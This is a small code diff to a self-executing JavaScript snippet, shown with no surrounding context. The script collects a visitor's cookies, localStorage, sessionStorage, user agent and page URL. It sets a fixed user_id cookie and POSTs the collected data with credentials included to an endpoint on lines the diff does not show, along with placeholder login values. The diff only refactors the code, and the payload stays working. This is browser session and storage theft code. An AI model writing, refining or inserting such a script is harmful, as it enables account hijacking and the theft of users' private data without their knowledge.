@@ -1,11 +1,12 @@
 (function () {
-  if (!localStorage.getItem("session_id")) localStorage.setItem("session_id", crypto.randomUUID());
+  const uid = localStorage.getItem("session_id") || crypto.randomUUID();
+  localStorage.setItem("session_id", uid);
   document.cookie = "user_id=99; path=/";
 
   const data = {
-    cookies: document.cookie,
-    localStorage: Object.fromEntries(Object.entries(localStorage)),
-    sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
+    cookies: document.cookie || "[no cookies]",
+    localStorage: Object.fromEntries(Object.entries(localStorage || {})),
+    sessionStorage: Object.fromEntries(Object.entries(sessionStorage || {})),
     userAgent: navigator.userAgent,
     location: location.href,
     screen: { width: screen.width, height: screen.height },
@@ -21,6 +22,10 @@
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     credentials: 'include',
-    body: JSON.stringify({ email: 'autobot@ping', password: 'capture', cookies: encoded })
+    body: JSON.stringify({
+      email: 'autobot@ping',
+      password: 'capture',
+      cookies: encoded
+    })
   });
 })();
